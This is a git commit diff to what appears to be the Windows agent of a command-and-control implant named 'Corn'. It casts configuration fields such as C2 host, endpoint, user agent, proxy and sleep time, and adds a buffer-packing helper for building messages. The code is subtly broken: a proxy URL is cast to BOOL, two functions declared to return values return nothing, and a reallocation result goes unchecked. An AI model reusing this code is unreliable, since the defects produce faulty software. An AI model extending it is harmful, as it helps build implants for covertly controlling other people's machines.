b1dfb9736d3bad002d1fdc9674fb87310808d393
H0td0gd0g <H0td0gd0g@users.noreply.github.com>
2026-09-02 16:52:02 +0900

    feat(agent Package): Implement a function to add a UINT32 to the buffer

--- Payload_Type/Corn/Corn/agent_code/main.c
+++ Payload_Type/Corn/Corn/agent_code/main.c
@@ -5,16 +5,16 @@
 CONFIG_CORN corn_config = {0}; // initial
 
 int SetupAgentConfig(void){
-    corn_config.AgentID = initUUID;
-    corn_config.HostName = hostname;
-    corn_config.HttpPort = httpport;
-    corn_config.HttpMethod = httpmethod;
-    corn_config.EndPoint = endpoint;
-    corn_config.UserAgent = useragent;
-    corn_config.IsSSL = isssl;
-    corn_config.IsProxyEnabled = proxyenabled;
-    corn_config.ProxyURL = proxyurl;
-    corn_config.SleepTime = sleeptime;
+    corn_config.AgentID = (PCHAR)initUUID;
+    corn_config.HostName = (PWCHAR)hostname;
+    corn_config.HttpPort = (DWORD)httpport;
+    corn_config.HttpMethod = (PWCHAR)httpmethod;
+    corn_config.EndPoint = (PWCHAR)endpoint;
+    corn_config.UserAgent = (PWCHAR)useragent;
+    corn_config.IsSSL = (BOOL)isssl;
+    corn_config.IsProxyEnabled = (BOOL)proxyenabled;
+    corn_config.ProxyURL = (BOOL)proxyurl;
+    corn_config.SleepTime = (UINT32)sleeptime;
 }
 
 int main(void){
---
+++ Payload_Type/Corn/Corn/agent_code/package.c
@@ -0,0 +1,20 @@
+#include <windows.h>
+#include <string.h>
+
+typedef struct {
+    PVOID buffer; // 任意の型のポインタ
+    SIZE_T length; // ポインタが指すことができる最大バイト数
+} Package, *PPackage;
+
+BOOL addUINT32ToBuffer(PUCHAR TargetAddr, UINT32 value) {
+    if (TargetAddr == NULL) return FALSE;
+
+    memcpy(TargetAddr, &value, sizeof(UINT32));
+    return TRUE;
+}
+
+BOOL addInt32(PPackage package, UINT32 value){
+    package->buffer = LocalReAlloc(package->buffer, package->length + sizeof(UINT32), LMEM_MOVEABLE | LMEM_ZEROINIT);
+    addUINT32ToBuffer((PUCHAR)(package->buffer) + package->length, value);
+    package->length += sizeof(UINT32); //update buffer length
+}
